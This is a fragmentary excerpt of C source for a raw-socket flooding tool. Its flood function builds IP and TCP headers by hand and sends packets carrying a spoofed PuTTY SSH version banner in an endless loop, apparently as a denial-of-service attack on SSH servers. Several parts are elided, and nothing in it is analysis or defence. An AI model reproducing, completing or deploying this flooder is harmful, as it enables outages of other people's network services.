...
static const char PAYLOAD[] = "SSH-2.0-";
static const char PuttyP[] = "SSH-2.0-PuTTY_Release_0.81\x0d\x0a";
...
char *generatePayload()
{
	...
	char *payload = malloc(29);

	memcpy(payload, PuttyP, sizeof(PuttyP));
...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		char *randomPayload = NULL;
		randomPayload = generatePayload();
		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, 28);
		tcph->check = 0;
		...
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 28;
		iph->check = csum((unsigned short *)datagram, iph->tot_len);
		tcph->check = tcpcsum(iph, tcph, 28);
